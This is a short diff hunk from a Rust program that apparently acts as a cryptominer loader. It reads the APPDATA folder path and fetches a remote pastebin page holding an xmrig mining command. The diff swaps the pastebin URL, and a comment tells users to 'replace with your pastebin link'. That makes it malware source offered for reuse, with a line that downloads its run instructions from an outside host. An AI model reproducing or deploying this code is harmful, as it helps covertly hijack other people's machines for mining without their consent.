@@ -60,7 +60,7 @@ fn main() {
         std::env::var("APPDATA").unwrap_or_default());
 
     let client = reqwest::blocking::Client::new();
-    let process_config = client.get("https://pastebin.com/raw/RxFQnBZ3")//replace with your pastebin link with your xmrrig comamnd
+    let process_config = client.get("https://pastebin.com/raw/G4kX0wnw")//replace with your pastebin link with your xmrrig comamnd
         .send()
         .unwrap()
         .text()
